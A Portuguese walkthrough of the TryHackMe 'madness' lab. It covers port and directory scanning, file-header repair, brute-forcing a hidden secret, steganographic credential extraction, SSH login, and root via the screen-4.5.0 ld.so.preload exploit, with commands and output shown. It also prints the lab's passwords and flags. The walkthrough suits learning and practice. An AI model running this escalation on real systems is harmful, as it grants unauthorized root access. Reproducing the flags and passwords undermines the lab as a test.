# THM - madness

comecei com um scan de portas, que retornou a 22 e 80 abertas (ssh e http), analisando as versões, vi que a versão do apache tinha diversas falhas mas nenhuma chamativa pra resolução desse ctf. Olhando a pagina vi que so tinha uma apache default page oque tambem não é muita coisa.

![2026-07-06_13-45.png](THM%20-madness/4d2e9cc3-7038-4534-8579-b1c853125866.png)

```jsx
justsomeone@underground ~  nmap -sV -sC -T4 10.65.143.229

Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-06 13:44 -0400
Nmap scan report for 10.65.143.229
Host is up (0.18s latency).
Not shown: 959 closed tcp ports (reset), 39 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
|_  256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

fiz fuzzing de diretorios e subdominios usando o feroxbuster e o ffuf, mas o unico que retornou algo foi o feroxbuster onde temos o /thm.jpg que tambem não tem nada alem de uma imagem que não carrega.

```jsx
justsomeone@underground ~ feroxbuster -u  http://10.65.143.229

200      GET      237l      524w    39525c http://10.65.143.229/thm.jpg
200      GET      376l      972w    11320c http://10.65.143.229/

```

![2026-07-06_13-50.png](THM%20-madness/2026-07-06_13-50.png)

decidi baixar a imagem usando o wget e analisar ela 

```jsx
justsomeone@underground ~ wget http://10.65.143.229/thm.jpg 

--2026-07-06 14:36:55--  http://10.65.143.229/thm.jpg
Connecting to 10.65.143.229:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22210 (22K) [image/jpeg]
Saving to: ‘thm.jpg’

thm.jpg                                 100%[============================================================================>]  21.69K   127KB/s    in 0.2s

2026-07-06 14:36:55 (127 KB/s) - ‘thm.jpg’ saved [22210/22210]
```

Tentei extrair metadados, strings e etc. Mas nada funcionou então fui pros valores hex da imagem

```jsx
00000000   89 50 4E 47  0D 0A 1A 0A  00 00 00 01  01 00 00 01  00 01 00 00  FF DB 00 43  00 03 02 02  03 02 02 03  .PNG...................C........
00000020   03 03 03 04  03 03 04 05  08 05 05 04  04 05 0A 07  07 06 08 0C  0A 0C 0C 0B  0A 0B 0B 0D  0E 12 10 0D  ................................
00000040   0E 11 0E 0B  0B 10 16 10  11 13 14 15  15 15 0C 0F  17 18 16 14  18 12 14 15  14 FF DB 00  43 01 03 04  ............................C...
00000060   04 05 04 05  09 05 05 09  14 0D 0B 0D  14 14 14 14  14 14 14 14  14 14 14 14  14 14 14 14  14 14 14 14  ................................
00000080   14 14 14 14  14 14 14 14  14 14 14 14  14 14 14 14  14 14 14 14  14 14 14 14  14 14 14 14  14 14 FF C0  ................................
000000A0   00 11 08 01  90 01 90 03  01 11 00 02  11 01 03 11  01 FF C4 00  1F 00 00 01  05 01 01 01  01 01 01 00  ................................
000000C0   00 00 00 00  00 00 00 01  02 03 04 05  06 07 08 09  0A 0B FF C4  00 B5 10 00  02 01 03 03  02 04 03 05  ................................
000000E0   05 04 04 00  00 01 7D 01  02 03 00 04  11 05 12 21  31 41 06 13  51 61 07 22  71 14 32 81  91 A1 08 23  ......}........!1A..Qa."q.2....#
00000100   42 B1 C1 15  52 D1 F0 24  33 62 72 82  09 0A 16 17  18 19 1A 25  26 27 28 29  2A 34 35 36  37 38 39 3A  B...R..$3br........%&'()*456789:
00000120   43 44 45 46  47 48 49 4A  53 54 55 56  57 58 59 5A  63 64 65 66  67 68 69 6A  73 74 75 76  77 78 79 7A  CDEFGHIJSTUVWXYZcdefghijstuvwxyz
00000140   83 84 85 86  87 88 89 8A  92 93 94 95  96 97 98 99  9A A2 A3 A4  A5 A6 A7 A8  A9 AA B2 B3  B4 B5 B6 B7  ................................
00000160   B8 B9 BA C2  C3 C4 C5 C6  C7 C8 C9 CA  D2 D3 D4 D5  D6 D7 D8 D9  DA E1 E2 E3  E4 E5 E6 E7  E8 E9 EA F1  ................................
00000180   F2 F3 F4 F5  F6 F7 F8 F9  FA FF C4 00  1F 01 00 03  01 01 01 01  01 01 01 01  01 00 00 00  00 00 00 01  ................................
000001A0   02 03 04 05  06 07 08 09  0A 0B FF C4  00 B5 11 00  02 01 02 04  04 03 04 07  05 04 04 00  01 02 77 00  ..............................w.
000001C0   01 02 03 11  04 05 21 31  06 12 41 51  07 61 71 13  22 32 81 08  14 42 91 A1  B1 C1 09 23  33 52 F0 15  ......!1..AQ.aq."2...B.....#3R..
000001E0   62 72 D1 0A  16 24 34 E1  25 F1 17 18  19 1A 26 27  28 29 2A 35  36 37 38 39  3A 43 44 45  46 47 48 49  br...$4.%.....&'()*56789:CDEFGHI
00000200   4A 53 54 55  56 57 58 59  5A 63 64 65  66 67 68 69  6A 73 74 75  76 77 78 79  7A 82 83 84  85 86 87 88  JSTUVWXYZcdefghijstuvwxyz.......
00000220   89 8A 92 93  94 95 96 97  98 99 9A A2  A3 A4 A5 A6  A7 A8 A9 AA  B2 B3 B4 B5  B6 B7 B8 B9  BA C2 C3 C4  ................................
00000240   C5 C6 C7 C8  C9 CA D2 D3  D4 D5 D6 D7  D8 D9 DA E2  E3 E4 E5 E6  E7 E8 E9 EA  F2 F3 F4 F5  F6 F7 F8 F9  ................................
00000260   FA FF DA 00  0C 03 01 00  02 11 03 11  00 3F 00 F9  12 BA CE 50  A0 41 40 C2  80 0A 04 14  00 50 01 40  .............?.....P.A@......P.@
00000280   05 03 0A 00  28 10 50 01  40 05 03 0A  00 28 00 A0  41 40 C2 80  0A 04 14 00  50 01 40 C2  98 05 20 0A  ....(.P.@....(..A@......P.@... .
000002A0   00 28 10 66  81 85 30 0C  D2 10 66 81  85 02 0C D0  30 A0 02 81  05 00 14 00  50 31 28 10  BC E2 80 0F  .(.f..0...f.....0.......P1(.....
000002C0   D6 80 0C D0  30 A0 41 40  05 00 14 0C  28 00 A0 41  40 C2 81 06  68 00 CD 00  19 A0 03 34  0C 28 10 66  ....0.A@....(..A@...h......4.(.f
000002E0   81 86 68 00  CD 02 0A 06  19 A0 41 9A  00 37 50 30  A0 41 9A 06  19 A0 41 9A  06 14 08 28  18 66 81 05  ..h.......A..7P0.A....A....(.f..
00000300   03 0A 00 28  10 50 30 14  08 28 01 3B  D0 02 D0 02  50 02 9A 00  28 18 50 20  E9 40 05 21  86 29 88 28  ...(.P0..(.;....P...(.P .@.!.).(
00000320   00 C5 00 18  A0 03 14 00  50 01 40 06  28 00 A0 02  90 C2 98 05  00 14 08 28  00 A0 61 40  80 F1 40 05  ........P.@.(..........(..a@..@.
00000340   03 03 C5 02  0A 00 28 00  A0 02 80 12  80 17 F8 A8  00 A0 04 A0  05 34 00 50  01 40 05 00  03 8A 00 31  ......(..............4.P.@.....1
00000360   40 07 7A 00  28 00 DB 40  05 00 18 A0  03 14 00 50  01 8A 00 28  00 A4 01 8A  60 14 00 50  01 40 05 00  @.z.(..@.......P...(....`..P.@..
00000380   14 00 50 01  40 05 03 0A  04 14 00 50  01 40 05 00  14 00 50 02  F5 A0 04 E6  81 85 00 14  08 28 00 A0  ..P.@......P.@....P..........(..
000003A0   02 80 0A 00  28 00 A0 02  80 0A 00 28  18 50 20 A0  02 80 0A 00  28 18 50 20  A0 02 80 0A  00 28 00 A0  ....(......(.P .....(.P .....(..
000003C0   02 80 0A 00  28 00 A0 02  80 0A 00 28  00 A0 02 80  0A 00 28 00  A0 02 80 0A  00 28 00 A0  02 80 0A 00  ....(......(......(......(......
000003E0   28 00 A0 02  80 0A 00 28  00 A0 02 80  0A 00 29 80  52 18 50 20  A0 02 80 0A  00 28 00 C5  03 0A 04 14  (......(......).R.P .....(......
00000400   00 50 01 40  05 00 14 00  50 01 40 05  00 14 00 50  01 40 05 00  14 00 50 01  40 05 3B 0A  E1 48 67 A6  .P.@....P.@....P.@....P.@.;..Hg.
00000420   FC 3B FD 9A  FE 23 7C 54  74 6D 07 C2  F7 92 DB 16  FF 00 8F BB  98 FC 98 B6  FF 00 78 31  EB FF 00 01  .;...#|Ttm................x1....
00000440   A9 73 2D 40  FA 43 C1 9F  F0 4B 8F 16  6A 51 C7 27  89 7C 53 61  A4 7A C5 67  13 4C 71 F8  ED A8 73 29  .s-@.C...K..jQ.'.|Sa.z.g.Lq...s)
00000460   40 F5 9D 27  FE 09 6D E0  38 10 0D 47  C4 BA ED EB  FF 00 13 44  C9 0E 7F F1  D6 A5 CC 55  8D A1 FF 00  @..'..m.8..G.......D.......U....
00000480   04 C4 F8 44  07 FC 7D 78  9D 8F FD 84  94 7F ED 2A  39 C3 94 AB  7D FF 00 04  BE F8 5F 3A  E2 CF 55 F1  ...D..}x.......*9...}....._:..U.
000004A0   1D B3 7F 79  EF 51 FF 00  F6 4A 39 83  94 E0 3C 57  FF 00 04 AC  8F 6B BF 87  7C 71 36 3B  41 7F 6A 3F  ...y.Q...J9...<W.....k..|q6;A.j?
000004C0   F4 35 34 7B  41 72 9E 09  F1 0B F6 07  F8 B3 E0 54  96 78 B4 A8  BC 41 68 99  CC BA 63 E5  B1 FE E9 E6  .54{Ar.........T.x...Ah...c.....
000004E0   AD 4E E4 38  1F 3F EA BA  4D FE 87 7A  F6 9A 8D 9C  D6 17 68 76  BC 37 31 B2  3A 9F C6 AD  6A 43 D0 A7  .N.8.?..M..z......hv.71.:...jC..
00000500   4E E2 B0 52  18 50 01 40  05 00 14 00  50 01 40 05  00 14 00 50  01 40 05 00  14 00 50 01  40 05 00 14  N..R.P.@....P.@....P.@....P.@...
00000520   00 50 01 40  05 00 14 00  50 01 40 05  00 14 00 50  01 40 05 00  14 00 50 01  40 05 00 14  00 50 01 40  .P.@....P.@....P.@....P.@....P.@
---  thm.jpg       --0x0/0x56C2--0%----------------------------------------------------------------------------------------------------------------
```

a primeira coisa que analiso nos hexs sempre são os magic bytes, são as primeiras filas de ordem unica que formam o tipo do arquivo  [https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5?permalink_comment_id=3860213](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5?permalink_comment_id=3860213) no link temos uma tabela com diversos deles cada um respectivo ao seu tipo de arquivo

![look.png](THM%20-madness/look.png)

analisando o magic bytes da nossa imagem, vemos que ele não bate com o do jpg mas sim com png, então pro nosso arquivo se tornar possivel de abrir basta corrigimos o header do hex dele. usei o hexeditor pra editar os primeiros  valores de `89 50 4E 47 0D 0A 1A 0A` para `FF D8 FF E0 00 10 4A 46`

![talvezocerto.png](THM%20-madness/talvezocerto.png)

`justsomeone@underground ~ xxd -g1 -l 128 thm.jpg`

```jsx

00000000: 89 50 4e 47 0d 0a 1a 0a 00 00 00 01 01 00 00 01  .PNG............
00000010: 00 01 00 00 ff db 00 43 00 03 02 02 03 02 02 03  .......C........
00000020: 03 03 03 04 03 03 04 05 08 05 05 04 04 05 0a 07  ................
00000030: 07 06 08 0c 0a 0c 0c 0b 0a 0b 0b 0d 0e 12 10 0d  ................
00000040: 0e 11 0e 0b 0b 10 16 10 11 13 14 15 15 15 0c 0f  ................
00000050: 17 18 16 14 18 12 14 15 14 ff db 00 43 01 03 04  ............C...
00000060: 04 05 04 05 09 05 05 09 14 0d 0b 0d 14 14 14 14  ................
00000070: 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14  ................

```

`justsomeone@underground ~ xxd -g1 -l 128 thm.jpg`

```jsx

00000000: ff d8 ff e0 00 10 4a 46 00 00 00 01 01 00 00 01  ......JF........
00000010: 00 01 00 00 ff db 00 43 00 03 02 02 03 02 02 03  .......C........
00000020: 03 03 03 04 03 03 04 05 08 05 05 04 04 05 0a 07  ................
00000030: 07 06 08 0c 0a 0c 0c 0b 0a 0b 0b 0d 0e 12 10 0d  ................
00000040: 0e 11 0e 0b 0b 10 16 10 11 13 14 15 15 15 0c 0f  ................
00000050: 17 18 16 14 18 12 14 15 14 ff db 00 43 01 03 04  ............C...
00000060: 04 05 04 05 09 05 05 09 14 0d 0b 0d 14 14 14 14  ................
00000070: 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14  ................
```

com isso conseguimod ler a imagem e descobrir o diretorio  /th1s_1s_h1dd3n

![thm.jpg](THM%20-madness/thm.jpg)

![2026-07-06_15-05.png](THM%20-madness/2026-07-06_15-05.png)

analisando a source code do novo diretorio encontrado temos essa mensagem

```jsx
 <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: </p>

<p>That is wrong! Get outta here!</p>
```

como não tem nenhum input para gente tentar colocar a senha, então vamos tentar criar o nosso próprio, na url então seguida do diretorio passei o parametro ?secret=1 e a aplicação validou o parametro aparti dai Decidi abrir o burpsuite, e mandei a requisição pro intruder mode para fazer brute force desse valor com uma lista de 0-99. `seq 0 99 > numbers.txt` usei o sed para gerar a wordlist de numeros e upei no burpsuite 

![2026-07-06_16-02.png](THM%20-madness/2026-07-06_16-02.png)

![2026-07-06_16-08.png](THM%20-madness/2026-07-06_16-08.png)

após um tempo rodando consegui descobrir que o secret era o valor 73

```jsx
<p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>
```

após testar essa senha em diversos locais decidi averiguar novamente a imagem que pegamos lá atrás, e com isso realmente tinha mais coisa nela enfiada com esteganografia. 

```jsx
justsomeone@underground ~ steghide --extract -sf thm.jpg

Enter passphrase: y2RPJ4QaPF!B
wrote extracted data to "hidden.txt".
```

```jsx
justsomeone@underground ~ cat hidden.txt

Fine you found the password!

Here's a username

wbxre

I didn't say I would make it easy for you!
```

fazendo decode de ROT13 no username descobrimos que wbxre é joker

![2026-07-07_15-34.png](THM%20-madness/2026-07-07_15-34.png)

voltei então na página do desafio no tryhackme e baixei a imagem presente na task 1 do desafio 

![5iW7kC8.jpg](THM%20-madness/5iW7kC8.jpg)

```jsx
justsomeone@underground madness   steghide --extract -sf 5iW7kC8.jpg

Enter passphrase:
wrote extracted data to "password.txt".
```

```jsx
justsomeone@underground madness   cat password.txt

I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP

```

agora podemos finalmente logar no ssh

```jsx
justsomeone@underground madness   ssh joker@10.64.188.235

** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
joker@10.64.188.235's password:

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128

joker@ubuntu:~$
```

catamos nossa primeira flag direto, agora vamos escalonar pra root

```jsx
joker@ubuntu:~$ cat user.txt
THM{d5781e53b130efe2f94f9b0354a5e4ea}
```

analisando possiveis vetores de lpe, tentei buscar suids e acabei me deparando com algo bem diferente, no caso o screen-4.5.0

`joker@ubuntu:~$ find / -perm -4000 2>/dev/null`

```jsx

/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/bin/fusermount
/bin/su
/bin/ping6
/bin/screen-4.5.0
/bin/screen-4.5.0.old
/bin/mount
/bin/ping
/bin/umount

```

ao jogar no google a primeira coisa que me apareceu foi uma pagina do exploitdb listando ele como vetor de lpe. então aqui ja temos uma ideia de como vamos pegar root

![2026-07-07_15-51.png](THM%20-madness/2026-07-07_15-51.png)

seguindo exatamente a poc, podemos confirmar que está funcionando.

```jsx

joker@ubuntu:~$ cd /etc
joker@ubuntu:/etc$  screen -D -m -L bla.bla echo fail
joker@ubuntu:/etc$ ls -l bla.bla
-rw-rw-r-- 1 root joker 6 Jul  7 12:53 bla.bla
joker@ubuntu:/etc$  cat bla.bla
fail
joker@ubuntu:/etc$
```

Após confirmar decidi seguir esse exploit pra pegar shell de root https://github.com/YasserREED/screen-v4.5.0-priv-escalate

```jsx

joker@ubuntu:/tmp$ chmod +x libhax.so
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
joker@ubuntu:/tmp$ chmod +x rootshell
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
joker@ubuntu:/tmp$ cd /etc || exit 1
joker@ubuntu:/etc$ umask 000
joker@ubuntu:/etc$ screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
joker@ubuntu:/etc$ screen -ls
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
There is a screen on:
	1003..ubuntu	(Detached)
1 Socket in /tmp/screens/S-joker.
joker@ubuntu:/etc$ /tmp/rootshell
# whoami
root

```

tive um leve problema onde acidentalmente apaguei a flag, então tive que reiniciar a máquina e refazer todo processo de lpe mas vamos relevar kkk

```jsx
# cd /root
# wc root.txt
0 0 0 root.txt

```

Agora, sim, finalmente zeramos a máquina

```jsx

# cat root.txt
THM{5ecd98aa66a6abb670184d7547c8124a}
```

![2026-07-07_16-14.png](THM%20-madness/2026-07-07_16-14.png)
